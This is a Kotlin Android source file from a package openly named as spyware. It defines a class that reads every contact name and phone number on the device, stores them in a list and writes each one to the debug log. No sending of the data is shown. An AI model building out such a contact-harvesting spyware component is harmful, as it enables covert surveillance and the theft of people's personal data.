package com.lautaro.spyware

import android.provider.ContactsContract
import android.content.Context
import android.annotation.SuppressLint
import android.util.Log

class ContactsRetriever(private val context: Context) {

    @SuppressLint("Range")
    fun getAllContacts(): List<Contact> {
        val uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI
        val projection = arrayOf(
            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
            ContactsContract.CommonDataKinds.Phone.NUMBER
        )

        val sortOrder = "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC"
        val cursor = context.contentResolver.query(uri, projection, null, null, sortOrder)

        val contacts = mutableListOf<Contact>()

        cursor?.let {
            while (it.moveToNext()) {
                val contactName =
                    it.getString(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                val contactPhoneNumber =
                    it.getString(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))

                contacts.add(Contact(contactName, contactPhoneNumber))

                // Log contact details
                Log.d("Contacts", "Name: $contactName, Phone: $contactPhoneNumber")
            }
            it.close() // Close the cursor
        } ?: run {
            // Handle case when no contacts are found
            Log.d("Contacts", "No contacts found")
        }

        return contacts
    }
}

data class Contact(
    val name: String,
    val phoneNumber: String
)